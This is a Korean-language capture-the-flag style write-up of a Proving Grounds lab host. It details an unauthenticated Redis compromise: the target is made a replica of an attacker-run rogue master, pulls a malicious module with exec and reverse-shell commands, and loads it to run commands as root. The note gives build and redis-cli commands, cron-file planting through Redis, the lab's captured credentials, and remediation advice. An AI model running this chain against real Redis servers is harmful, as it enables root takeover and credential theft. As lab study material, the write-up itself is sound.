---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/redis
type: machine
platform: pg
os: linux
ip: 192.168.248.69
ports: [22, 80, 6379, 8080, 27017]
services: [http, http-proxy, mongodb, redis, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 1
---

> [!info] 요약
> 타겟 `192.168.248.69` · Debian 9 Stretch (kernel 4.9.0-19-amd64, 호스트명 `wombo`) · Fundamental · **플래그 1개(direct-to-root)**
> 진입점: 6379 무인증 Redis 5.0.9 가 root 로 구동 → 복제(replication) 기반 임의 파일 쓰기로 악성 모듈 `exp.so` 심기 → `MODULE LOAD` → `system.exec` 가 root 명령 실행 → `/root/proof.txt`
> 권한상승: **없음** — 모듈이 redis-server(uid 0)의 프로세스 컨텍스트에서 돌아 foothold 가 곧 root
> `proof.txt` = `d3441ce13f1b497ccb0575effb70ba65` · `local.txt` 은 이 호스트에 존재하지 않음
> 시행착오·교훈 → [[_PLAYBOOK]]

> [!warning] 이 노트를 읽는 규약 — 관측과 재구성을 구분할 것
> 코드펜스는 Kali 산출물 `~/PG/Wombo/`(mtime 2026-08-20 11:25~12:06) 원문만 실음. 예외는 `objdump` 블록 하나로, 보존된 `exp.so` 를 노트 개작 시점에 재조회한 것이며 그 자리에 캡션으로 표기함. 블록마다 출처 캡션을 붙임.
> - **이 박스에서 타겟 대화형 셸을 한 번도 잡지 않았음.** 타겟 측 출력은 전부 `redis-cli … system.exec` 비대화형 실행 결과임 — 타겟 pty 프롬프트가 노트에 없는 것은 누락이 아니라 사실 그대로임. 산출물의 `#`·`=====` 줄은 스크립트가 붙인 주석이지 셸 프롬프트가 아님
> - Kali 의 `redis-server`/`redis-cli` 는 **8.0.4** 라 타겟(5.0.9)과 에러 문구가 다름. 타겟 고유 동작은 타겟에 직접 친 출력(`ssh_dir_check.txt` 등)만 인용함
> - `[가정]` 은 이 박스에서 실행·관측하지 않은 추론임

## Target #1 – 192.168.248.69

### Initial Access – 무인증 Redis 의 복제 프로토콜로 임의 파일을 쓴 뒤 그 파일을 모듈로 로드해 root 컨텍스트 명령 실행

**Vulnerability Explanation:** 무인증 Redis 5.0.9 의 복제·모듈 기능 연쇄 남용(unauthenticated Redis → arbitrary file write → module load RCE).
- 6379 가 인증 없이 외부 명령을 수용 — `AUTH` 미설정, `CONFIG`·`SLAVEOF`·`MODULE` 이 `rename-command` 로 숨겨져 있지 않아 원래 이름 그대로 응답
- `SLAVEOF <공격자IP> <포트>` 로 타겟을 공격자의 가짜 마스터(rogue master)의 슬레이브로 만들면, 최초 동기화(full resync) 때 마스터가 보낸 바이트가 타겟의 `dir`/`dbfilename` 경로에 **그대로 파일로 기록**됨 = 임의 파일 쓰기
- Redis 4.0+ 의 `MODULE LOAD <path>` 가 그 파일을 `dlopen` 하고 `RedisModule_OnLoad` 를 호출 — 설계상 임의 네이티브 코드 실행. 심은 `exp.so` 는 `system.exec`(`popen`)·`system.rev`(리버스셸) 두 커맨드를 등록함
- redis-server 가 **uid 0 으로 구동**되어 `popen` 자식이 uid 0 을 상속 → 무인증 원격 RCE 가 곧 root

**Vulnerability Fix:**
- `bind 127.0.0.1` + 방화벽으로 6379 를 신뢰 경계 밖에 노출하지 말 것. 원격 접근이 필요하면 SSH 터널/VPN 뒤에 둘 것
- `requirepass`(AUTH) 설정 + protected-mode 유지. `rename-command CONFIG ""` · `MODULE ""` · `SLAVEOF ""` 중 하나만 걸어도 이 경로 전체가 닫힘
- redis-server 를 root 로 돌리지 말 것 — 전용 저권한 계정으로 구동하면 같은 모듈 로드가 성사돼도 피해가 그 계정 권한으로 한정됨. 이 박스의 치명상은 root 구동임
- egress 필터링은 완화책일 뿐 방어가 아님 — 이 타겟은 성공 회선이 tcp/80 하나였으나 그 한 포트로 익스플로잇 전달이 성사됨. 아웃바운드 최소화 + 프록시 강제가 필요함
- 서비스 자격증명을 평문 config 에 두고 root 가독으로 방치하지 말 것 — `/opt/nodebb/config.json` 의 MongoDB 자격증명·세션 secret 이 침해 후 횡적 이동의 재료가 됨(`Post-Exploitation` 절)

**Severity:** Critical — 무인증 원격 RCE, 그것도 즉시 root

**Steps to reproduce the attack:**
1. `redis-cli -h <타겟> INFO server` · `MODULE LIST` · `CONFIG GET dir` · `INFO replication` 으로 무인증·모듈 미로드·쓰기 경로·`role:master` 확인
2. `n0b0dyCN/redis-rogue-server` 의 `exp.so` 를 현대 gcc 로 빌드
3. rogue master 를 tcp/80 에 세우고 `redis-rogue-server.py` 실행
4. 타겟이 full resync 로 `exp.so` 를 자기 CWD 에 기록 → `MODULE LOAD ./exp.so`
5. `redis-cli … module list` 로 `system` 모듈 등재 확인
6. `redis-cli … system.exec 'cat /root/proof.txt'`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.69 | TCP: 22, 80, 6379, 8080, 27017 |

필터링된 포트가 65529개라 스캔 결과가 흔들릴 수 있음. 고속(`--min-rate 5000`)과 저속(`--max-rate 500`) 두 번을 돌려 교차 확인함.

```text
# Nmap 7.98 scan initiated Thu Aug 20 11:25:28 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Wombo/nmap.log 192.168.248.69
Nmap scan report for 192.168.248.69
Host is up (0.084s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
53/tcp    closed domain
80/tcp    open   http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
6379/tcp  open   redis      Redis key-value store 5.0.9
8080/tcp  open   http-proxy
|_http-title: Home | NodeBB
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
```
— 출처: `~/PG/Wombo/nmap.log` 1~19행 원문. 이어지는 8080 의 `fingerprint-strings` 블록 70여 행은 생략

```text
27017/tcp open   mongodb    MongoDB 4.0.18 4.1.1 - 5.0
```
— 출처: 같은 파일 91행

```text
# Nmap 7.98 scan initiated Thu Aug 20 11:26:54 2026 as: /usr/lib/nmap/nmap -sS -p- -Pn --max-rate 500 -oN /home/kali/PG/Wombo/nmap_lowrate.log 192.168.248.69
Nmap scan report for 192.168.248.69
Host is up (0.084s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
6379/tcp  open   redis
8080/tcp  open   http-proxy
27017/tcp open   mongod

# Nmap done at Thu Aug 20 11:31:17 2026 -- 1 IP address (1 host up) scanned in 263.27 seconds
```
— 출처: `~/PG/Wombo/nmap_lowrate.log` 전문

두 스캔이 **정확히 같은 6개 포트**와 같은 `Not shown: 65529 filtered` 를 냄 — 위양성 없음. `53/tcp closed` 는 필터링(무응답)이 아니라 RST 응답이라는 뜻이고 서비스는 없음.

**OS·커널 판정 — 독립 근거 3개**
- nmap 배너 `OpenSSH 7.4p1 Debian 10+deb9u7` → Debian 9 계열(`nmap.log`)
- Redis `INFO server` → `os:Linux 4.9.0-19-amd64 x86_64` · `gcc_version:6.3.0`(`redis_recon.txt`)
- 침투 후 `uname -a` → `Linux wombo 4.9.0-19-amd64 #1 SMP Debian 4.9.320-2 (2022-06-30)`(`id_output.txt`)

세 출처가 합의 → Debian 9 Stretch, kernel 4.9. **glibc 2.24 는 Debian 9 의 표준 버전이라는 일반 지식에서 온 값이고, 타겟에서 `ldd --version` 을 직접 친 기록은 없음**(관측 없음).

**서비스별 판정**

| 포트 | 서비스 | 판정 |
|---|---|---|
| 22 | OpenSSH 7.4p1 | 자격증명 없이는 무의미 |
| 80 | nginx 1.10.3 | 기본 "Welcome to nginx!" 페이지 — 콘텐츠 없음. 파일 쓰기 목표·인바운드 회신 채널로는 쓸 수 있음 |
| 6379 | **Redis 5.0.9** | 무인증 · `role master` · root 구동 → **진입점** |
| 8080 | NodeBB (Node.js) | MongoDB 백엔드 포럼. 4개 카테고리 전부 0 topics / 0 posts — 갓 설치 상태 |
| 27017 | MongoDB 4.0.18 | **인증 요구** — 익명 접근 거부 |

![[PG-Wombo-nginx-80.png]]
![[PG-Wombo-nodebb-8080.png]]

MongoDB 는 스크립트 스캔에서 빌드 정보만 흘리고 데이터 명령은 전부 거부:

```text
|   Server status
|     ok = 0.0
|     errmsg = command serverStatus requires authentication
|     codeName = Unauthorized
|_    code = 13
| mongodb-databases: 
|   ok = 0.0
|   errmsg = command listDatabases requires authentication
|   codeName = Unauthorized
|_  code = 13
```
— 출처: `~/PG/Wombo/mongo_nmap.txt` (`--script mongodb-databases,mongodb-info`)

**Redis 열거 — 익스플로잇 가능 여부를 그 자리에서 판정**

무인증 Redis 를 만나면 가장 먼저 `INFO`·`MODULE LIST`·`CONFIG GET dir`·`INFO replication` 을 침.

```text
===== INFO server =====
# Server
redis_version:5.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:85c881476bf91b2f
redis_mode:standalone
os:Linux 4.9.0-19-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:6.3.0
process_id:550
run_id:a841ae724ff6477a48a433837b3e04d9a326145f
tcp_port:6379
uptime_in_seconds:64570248
uptime_in_days:747
hz:10
configured_hz:10
lru_clock:8807841
executable:/usr/local/bin/redis-server
config_file:/etc/redis/redis.conf
===== MODULE LIST =====

===== CONFIG GET dir =====
dir
/
===== CONFIG GET dbfilename =====
dbfilename
dump.rdb
===== INFO replication =====
# Replication
role:master
connected_slaves:0
master_replid:6af317f475a48f680a36bae46dcc6164fa5d0174
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0
```
— 출처: `~/PG/Wombo/redis_recon.txt` 전문

읽는 법:
- `redis_version:5.0.9` — 모듈 로드 RCE 가 통하는 4.x/5.x 대역
- `MODULE LIST` 응답이 **빈 줄** — 모듈 미로드이자 `MODULE` 이 `rename-command` 로 숨겨져 있지 않음
- `CONFIG GET dir` = `/` — `CONFIG` 도 살아 있고 쓰기 경로를 자유롭게 지정 가능
- `role:master` — `SLAVEOF` 로 슬레이브 전환 가능
- `executable:/usr/local/bin/redis-server` — 배포판 패키지 경로(`/usr/bin/…`)가 아닌 **소스 컴파일본**. `gcc_version:6.3.0` 이 그 정황을 보강함
- AUTH 없이 위 명령이 전부 응답 = 무인증. **`CONFIG GET protected-mode` 를 직접 친 기록은 없음**(관측 없음) — 외부에서 명령이 그대로 수용됐다는 사실로 실효가 없었음이 확인될 뿐임

### Initial Access – Redis 모듈 로드 RCE

**모듈 빌드.** 저장소 prebuilt `.so` 대신 재빌드했고, 현대 gcc 에서 컴파일하려면 인클루드 두 개와 `-Werror` 완화가 필요했음.

```bash
  git clone https://github.com/n0b0dyCN/redis-rogue-server
  cd redis-rogue-server/RedisModulesSDK/exp
  # fix modern-gcc build: add includes + silence -Werror
  sed -i 's|#include <netinet/in.h>|#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <string.h>|' exp.c
  sed -i 's/-Wall/-w/' Makefile
  make                      # -> exp.so   (needs only GLIBC_2.2.5, loads fine on Debian 9 glibc 2.24)
```
— 출처: `~/PG/Wombo/manual_procedure.txt` §0 (들여쓰기·주석 원문 유지)

`exp.so` 의 진입점이 등록하는 두 커맨드가 이 익스플로잇의 전부임:

```c
int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
	if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
```
— 출처: `~/PG/Wombo/rrs/RedisModulesSDK/exp/exp.c`

`system.exec` 의 실체는 `popen` 한 줄임:

```c
		FILE *fp = popen(cmd, "r");
```
— 출처: 같은 파일 `DoCommand` 발췌. `popen` 은 `/bin/sh -c <cmd>` 를 fork/exec 하고 자식은 부모(redis-server)의 권한을 상속함

**glibc 호환은 확인하고 넘어감.** 최신 Kali 에서 빌드한 `.so` 가 Debian 9(glibc 2.24)에서 심볼 불일치를 낼 것이라 의심했으나 근거가 없었음.

```bash
objdump -T ~/PG/Wombo/rrs/exp.so | grep -o 'GLIBC_[0-9.]*' | sort -u
```

```text
GLIBC_2.2.5
```
— 출처: 보존된 `exp.so` 를 노트 개작 시점(2026-08-26)에 재조회. 저장소 prebuilt(`exp.so.prebuilt.bak`)는 `GLIBC_2.2.5`·`GLIBC_2.4` 두 개를 요구하나 **둘 다 2.24 이하라 어느 쪽도 심볼 불일치를 일으키지 않음** — 재빌드가 성공의 원인이었다는 증거는 없음

**전달.** rogue master 를 tcp/80 에 세워 실행:

```bash
  cd redis-rogue-server ; cp RedisModulesSDK/exp/exp.so exp.so
  sudo python3 redis-rogue-server.py --rhost 192.168.248.69 --rport 6379        --lhost 192.168.45.207 --lport 80
```
— 출처: `~/PG/Wombo/manual_procedure.txt` §1 (공백 원문 유지)

스크립트는 `Loading module...` 이 찍힌 **뒤에** 예외로 죽음. `din()` 이 소켓 응답을 `.decode('gb18030')` 로 풀려다 RDB 바이너리에서 실패하는 것이고, **모듈은 이미 심겨 있음.**

```text
[info] TARGET 192.168.248.69:6379
[info] SERVER 192.168.45.207:80
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
[err ] UnicodeDecodeError('gb18030', b'$300\r\ndr\xe5Q\xb2\xa4nJ\xe1]\xfc\x0e\xcf,\x9e\xf5>M\xe31\x9b\xd7\x98\xf2e\x86\x8eSb@\x98\x86)\x89\x83\xd8\x83R(\xacK\x0f\xb0\xb6\xfa-\xe5s\x972\x01\xbf\x04\x883\xb6\xfd\x1b\\\x96+\x15\xd2H"\xa1\x0b\xc0\xfbu\xdf&\xe9\xa4\x85\x9fFVB_\xc5\x8e\xf9\x0e7\xb8\xbb\x95\xedIB"[\x17L\xd2\xddS\x96\x868\xd9e\xf3\xb7W\xae\xffd~\xef\x98\t\x8f\r#\x0b)9\xb3\xa8+B\xe9\x8d\xc9\x8f\x94(\x82\x89\x81a\x9f&\xd4\xaf\x8c#\xbcg\xd6\xcf>\xb5\x93g\xd6\xd5nZE,|\xcc\xfc\xd7D\xd9Ha\x9d\xe0\xae\x90\x19\xd9\x93\xbbU\x9d66@\x12\x84\xca\x10\xc7c\xb1\x92`i\xda~q\'\x86jo\xf2l\xa7BY\x9dE\x17G\xba\x13h\xc2\xe5hV\xee\xf6\xa9\x84j\xaa*(|P\x9e\x156m\x1c\xca\x98\xc0\xd7g\xa4sy\xdc&\xcf\xcdz\x85\xf5\xa80\xf8\xdb\x7flNj\x01\xec;\x17\x11I\xef\x0f\xf0N\x02G\xef\xb9\xda]\x84\x0f\xd0\x06\xd0\xe6\xc6\xf2\xd0\xe5QbQqx\x1a\x0e!\xe5\xaa\xe7;W\xa5\xa5E\xbb\x01sE\x1a\x9b~\x1b\x8fK\x9a}q\r\n', 16, 17, 'illegal multibyte sequence')
```
— 출처: `~/PG/Wombo/verify_run.log` (ANSI 색상 이스케이프만 제거, 배너 아스키아트 생략, 문자열은 원문)

성공 판정은 스크립트가 아니라 **타겟 상태**로 함:

```text
# redis-cli -h 192.168.248.69 module list   (BEFORE exploit)
(empty array -> vulnerable, no module loaded)

# AFTER redis-rogue-server module load:
name
system
ver
1
```
— 출처: `~/PG/Wombo/module_list.txt`

`system` 모듈 등재 확인 후 커넥션 하나로 root 명령을 침:

```text
# redis-cli -h 192.168.248.69 system.exec 'id'
uid=0(root) gid=0(root) groups=0(root)
# whoami; hostname
root
wombo
# uname -a
Linux wombo 4.9.0-19-amd64 #1 SMP Debian 4.9.320-2 (2022-06-30) x86_64 GNU/Linux
```
— 출처: `~/PG/Wombo/id_output.txt`. 선두 `#` 줄은 산출물이 붙인 명령 주석이지 셸 프롬프트가 아님

**수동 대안 — 스크립트 없이(자동 도구가 막힐 때)**

rogue master 역할만 도구가 필요하고 나머지는 순수 `redis-cli` 임. rogue master 는 개념적으로 「슬레이브의 `PSYNC` 에 `+FULLRESYNC` 로 답한 뒤 `$<len>\r\n<exp.so 바이트>` 를 흘려보내는」 최소 TCP 서버임.

```bash
  redis-cli -h 192.168.248.69 slaveof 192.168.45.207 80
  redis-cli -h 192.168.248.69 config set dbfilename exp.so
  # victim pulls the .so from the rogue master's fake RDB into its CWD, then:
  redis-cli -h 192.168.248.69 module load ./exp.so
  redis-cli -h 192.168.248.69 slaveof no one
  redis-cli -h 192.168.248.69 config set dbfilename dump.rdb
```
— 출처: `~/PG/Wombo/manual_procedure.txt` §2

각 줄의 역할:
- **`slaveof`** — 복제 트리거. 이게 있어야 full resync 가 일어나 마스터의 바이트가 타겟 디스크에 쓰임
- **`config set dbfilename`** — 쓰기 대상 파일명. `dir` 는 이미 `/` 라 별도 지정이 불필요했음. 다른 박스에서는 `config set dir <쓰기가능 경로>` 를 함께 침
- **`module load ./exp.so`** — `./` 는 Redis 의 현재 작업 디렉터리(= `dir`) 기준 상대경로
- **`slaveof no one` · `dbfilename dump.rdb`** — Redis 를 정상 상태로 되돌림. 빼면 타겟이 계속 우리 슬레이브로 남아 이상 동작함

RDB 앞뒤에 헤더·푸터 바이트가 붙어 결과 파일은 순수 `.so` 가 아니라 **RDB 껍데기로 감싼 `.so`** 임. ELF 로더는 파일 선두의 ELF 매직만 보므로 모듈로는 정상 동작함.

**rogue master 포트 — 이 박스의 사활을 갈랐으나 「80만 허용」은 `[가정]`**

- **실측** — 성공한 회선은 tcp/80 하나. `verify_run.log` 의 `SERVER 192.168.45.207:80` → `Loading module...`
- **실측** — 443 시도가 실재함. `run_rrs.sh` 가 `--lport 443` 으로 스크립트화돼 있음. 다만 그 실행 로그는 보존되지 않음(tmux 에서 `exec bash` 로 띄워 리다이렉트 없음). 별개로 `exploit_run2.log`(11:28:40)가 배너 2줄에서 잘려 남아 있음 — 「한 번 더 돌렸다」는 기록이지 결과의 기록은 아님
- **실측** — 최초 :80 시도는 egress 가 아니라 **Kali 로컬 bind** 로 실패

```text
[info] SERVER 192.168.45.207:80
[info] Setting master...
[info] Setting dbfilename...
[err ] OSError(98, 'Address already in use')
```
— 출처: `~/PG/Wombo/exploit_run.log` (ANSI 이스케이프·배너 제외)

- `[가정]` 「타겟 egress 가 tcp/80 만 허용」 — 근거는 `writeup_notes.txt` 의 동시대 기록(443·8080·21000 으로 시도했고 tcpdump 에 connect-back SYN 0건)뿐이고 **캡처 파일도 그 시도의 실행 로그도 보존되지 않음.** 확정된 것은 성공 회선이 tcp/80 하나라는 것까지이며, SYN 부재의 원인이 타겟 egress 필터인지 다른 계층인지는 남은 산출물로 구분할 수 없음
- ⚠️ **실패한 :80 과 성공한 :80 은 같은 포트임.** 포트를 바꾼 것이 성공의 원인이라는 서술은 산출물이 지지하지 않음

**Local.txt value:** **없음** — 이 호스트에 `local.txt` 가 존재하지 않음.

```text
=== PG Wombo (192.168.248.69) ===
proof.txt (root): d3441ce13f1b497ccb0575effb70ba65
local.txt: DOES NOT EXIST on this host (direct-to-root box; /home empty, nodebb home never created)
```
— 출처: `~/PG/Wombo/flags.txt`

근거 셋:
- `find / -name local.txt` 무결과 · `/home` 빈 디렉터리 · NodeBB 구동 계정(uid 1000)의 홈 `/home/nodebb` 미생성 — `~/PG/Wombo/writeup_notes.txt` `[FLAGS]` 항목
- 플래그 회수 원문 파일 `flags_raw.txt` 가 **0바이트**로 남음(12:00:46). 「빈 파일」이 아니라 **「빈 응답을 받았다는 기록」**임. 2분 뒤 `flags.txt` 를 손으로 정리해 남김. `[가정]` 어느 명령의 출력인지는 파일명 외 근거가 없음
- 포털 플래그 슬롯도 `proof.txt` 하나 — 단일 플래그 direct-to-root 박스

⚠️ `find` 자체의 원문 출력은 보존되지 않았음(관측 없음). 위 셋이 남은 근거 전부임. **저권한 사용자 플래그를 찾아 헤매지 말 것 — 이 박스 설계에 그 단계가 없음.** 같은 형태의 박스: [[Bratarina]] · [[Detection]].

### Privilege Escalation – 없음 (Redis 모듈 로드가 이미 root 컨텍스트 — 별도 권한상승 단계 부재)

**Vulnerability Explanation:** 별도 권한상승 취약점 없음. 모듈이 redis-server(uid 0)의 프로세스 컨텍스트에서 돌아 최초 명령 실행부터 uid=0.

**Vulnerability Fix:** 해당 없음 — `Initial Access` 의 Fix 중 「redis-server 를 root 로 돌리지 말 것」이 이 항목도 함께 닫음.

**Severity:** 해당 없음 — 심각도는 `Initial Access` 에 계상(Critical).

**Steps to reproduce the attack:** 해당 없음 — 추가 단계 없이 최초 명령 실행이 root.

근거:
- `system.exec` 로 친 **첫 명령**이 이미 `uid=0(root) gid=0(root) groups=0(root)`(`id_output.txt`)
- 인과는 모듈이 아니라 **redis-server 의 구동 계정**임. `exp.c` 의 `DoCommand` 가 `popen(cmd, "r")` 로 `/bin/sh -c <cmd>` 를 fork/exec 하고, 자식은 부모의 uid 를 상속. 그 부모가 root 라는 근거는 `system.exec 'id'` 출력 자체이며, `redis_recon.txt` 의 `process_id:550` 은 pid 일 뿐 구동 계정의 근거가 아님
- 따라서 `sudo -l` · `find / -perm -4000` · `getcap -r /` 를 친 산출물이 없음 — **관측 없음이 아니라 칠 이유가 없어 미실행**

> [!warning] 흔한 오독 — 「모듈 로드는 root RCE 다」
> 모듈 로드는 **redis-server 가 가진 권한으로의** RCE 임. Redis 가 `redis` 계정으로 돌았다면 같은 익스플로잇이 `uid=NNN(redis)` 를 냈을 것이고 그때는 별도 권한상승이 필요함. 「root RCE」의 root 는 Redis 의 구동 계정에서 오지 익스플로잇에서 오지 않음.

### Post-Exploitation

**Proof.txt value:** `d3441ce13f1b497ccb0575effb70ba65`

증거는 `~/PG/Wombo/flags.txt`(값)와 `~/PG/Wombo/id_output.txt`(`id`·`whoami`·`hostname`·`uname`)로 **분리된 두 파일**임.

⚠️ **증거 형식 미달.** `whoami; id; hostname; hostname -I; date; cat /root/proof.txt` 를 한 명령으로 묶어 찍은 `proof_root.txt` 가 없고, 게다가 전부 `system.exec` 비대화형 실행이라 **대화형 셸에서 읽었다는 증거가 아예 없음.** OSCP 규정 원문이 0점으로 명시하는 것은 웹셸(*"this includes any type of web-based shell"*)이고, `system.exec` 는 웹 기반이 아니라 Redis 모듈 커맨드임 — `[가정]` 「비대화형 단발 실행이라 같은 취지에 걸린다」([[Butch]]). 어느 쪽이든 **한 화면 증거가 없다는 사실은 확정**이므로 이 형태로 끝내지 말 것.

리버스셸은 **산출물에 세션 캡처 0건** — `system.rev` 로 잡은 기록이 없음. `writeup_notes.txt` 는 443·8080·21000 으로의 리버스셸/rogue 복제 시도와 connect-back SYN 0건을 기록하나, 그 시도가 `system.rev` 였는지 모듈 로드 이전의 다른 수단이었는지는 산출물로 확정되지 않음(관측 없음).

**부수 수집물** — root 권한으로 `/opt/nodebb/config.json` 을 읽어 얻음:

```text
# /opt/nodebb/config.json (read as root via system.exec) - bonus loot
mongo user: nodebb
mongo pass: 6ee2d89219d3d7af7f7666e483ffaed4
mongo db:   nodebb  (127.0.0.1:27017)
nodebb secret: 1bd93731-233b-4116-843a-3d66404e402f
```
— 출처: `~/PG/Wombo/nodebb_mongo_creds.txt`

이 박스에서는 불필요(이미 root). 다만 27017 MongoDB 가 익명 접근을 거부했으므로 피벗 시나리오에서는 인증 접속·NodeBB 사용자 해시 덤프·세션 위조(secret)의 재료가 됨. **당장 안 써도 줍는다.**

**남긴 흔적**

타겟에 심은 것:
- `/exp.so` — Redis CWD(`dir` = `/`)에 복제로 기록된 악성 모듈. `MODULE UNLOAD system` 후 삭제
- `/etc/cron.d/pwnjob` — `plant_cron.sh`·`plant_cron2.sh` 가 `config set dir /etc/cron.d` + `dbfilename pwnjob` + `save` 로 두 차례 기록. Redis 응답은 두 번 다 `OK`(`plant_cron.log`·`plant_cron2.log`)
- `/etc/cron.d/zz` · `/var/spool/cron/crontabs/root` · `/var/www/html/*.txt` 진단용 마커 — `writeup_notes.txt` 의 정리 목록에 등재. 어느 스크립트가 만들었는지는 산출물에 없음(관측 없음)
- **SSH 공개키는 타겟에 심긴 적 없음.** `~/PG/Wombo/wombo_key.pub` 는 `plant_cron*.sh` 의 크론 명령 문자열 안에만 들어 있었고 그 크론이 돌지 않았음. `config set dir /root/.ssh` 는 애초에 실패(`ssh_dir_check.txt`)

Redis 원복:
- `writeup_notes.txt` 기록 — `MODULE UNLOAD system` · `slaveof no one` · `dir /` · `dbfilename dump.rdb` · `rdbcompression yes` · `flushall` · `/exp.so` 삭제 · webroot + cron.d clean 확인
- `ssh_dir_check.txt` 의 `config get dir` → `/` 로 복귀가 보임
- `[가정]` `/etc/cron.d/{zz,pwnjob}` · `/var/spool/cron/crontabs/root` · webroot 마커의 실제 제거를 **사후에 재확인한 산출물은 없음** — `writeup_notes.txt` 의 자기 보고뿐임

Kali 쪽:
- rogue master 는 `sudo python3 redis-rogue-server.py` 로 :80 에 떴고 스크립트 종료로 정리됨. `run_rrs.sh` 는 `exec bash` 로 끝나 그 tmux 세션이 남았을 수 있음(관측 없음)
- 생성한 SSH 키쌍 `~/PG/Wombo/wombo_key`·`.pub` 는 Kali 에 그대로 남아 있음
- NFS 마운트 없음

## 관련

- Redis 모듈 로드 RCE PoC: <https://github.com/n0b0dyCN/redis-rogue-server> (디스크 `~/PG/Wombo/rrs/`, HEAD `d60f03d`)
- 원 기법: "Redis post-exploitation" (ZeroNights 2018)
- CVE-2022-0543 — Debian/Ubuntu **패키지판** Redis 의 Lua 샌드박스 탈출. 이 박스는 소스 컴파일본(`executable:/usr/local/bin/redis-server`)이라 **미적용**
- Metasploit(참고, 미사용): `exploit/linux/redis/redis_replication_cmd_exec`
- Redis 보안 문서 — protected-mode · `rename-command` · `requirepass`
- [[Squid]] — 실패 원인을 계층으로 분리하라. 그쪽은 `certutil` 성공 배너를 믿은 오독, 이쪽은 `errno 98` 을 원격 방화벽으로 오독
- [[Butch]] — 웹셸로 읽은 플래그는 OSCP 0점. `system.exec` 를 같은 지위로 보는 것은 `[가정]` 이나, 한 화면 증거 부재는 양쪽 공통
- [[Hawat]] — 아웃바운드 포트 제한. 그쪽은 443, 이쪽은 80 이 성공 회선
- [[Bratarina]] · [[Detection]] — 단일 플래그 direct-to-root 박스
- [[_PLAYBOOK]] — 이 박스의 시행착오·기법 카드·시험 관점. 개별 항목:
    - [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] — 스크립트 크래시 ≠ 익스플로잇 실패
    - [[_PLAYBOOK#A-2-10. 무인증 Redis 인데 대체 경로(cron.d · authorized_keys · Lua)가 전부 막힌다]]
    - [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] — `errno 98` 은 언제나 로컬
    - [[_PLAYBOOK#B-25. 무인증 Redis = 임의 파일 쓰기 = RCE]]
    - [[_PLAYBOOK#B-85. 「타겟 glibc 가 낮아서 안 될 것」은 추측이다 — 심볼 버전을 확인하라]]
